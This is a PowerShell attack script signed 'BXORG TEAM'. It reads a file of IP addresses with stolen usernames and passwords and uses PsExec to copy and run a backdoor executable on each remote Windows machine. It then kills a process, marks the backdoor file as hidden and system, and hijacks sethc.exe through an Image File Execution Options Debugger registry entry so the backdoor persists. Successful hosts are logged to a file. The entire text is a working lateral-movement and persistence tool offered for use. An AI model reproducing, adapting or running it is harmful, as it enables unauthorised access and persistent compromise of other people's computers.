$backdoor = read-Host "enter backdoor path like c:\backdoor.exe"
$good = Read-Host "enter good.txt path like c:\good.txt"
Get-Content $good | foreach {
$ip = $_.Split("@")[0]
$user = $_.Split("@")[1].split(";")[0]
$password =$_.Split(";")[1]
Write-Host "initial backdooor ....."
Invoke-Expression ".\PsExec.exe \\$ip -u $user -p $password -c -d -n 10 $backdoor c:\windows\$backdoor"
#last exit code if 1460 that's time out !
if ( $LASTEXITCODE -ne 1460 ) 
{
write-host " kill process....."
Invoke-Expression ".\Pskill.exe \\$ip -u $user -p $password good.exe"
write-host "hidding backdoor ....."
Invoke-Expression ".\PsExec.exe \\$ip -u $user -p $password -n 2 cmd.exe /c attrib +S +H c:\windows\$backdoor"
Write-Host " add registry ..."
Invoke-Expression ".\PsExec.exe \\$ip -u $user -p $password -n 2 cmd.exe /c REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /f /v Debugger /t REG_SZ /d ""C:\windows\$backdoor"" "
$ip >>final.txt
}
else
{ 
$ip >>fuck.txt
}
}
"BXORG TEAM ...." >> final.txt
"BXORG TEAM ...." >> fuck.txt 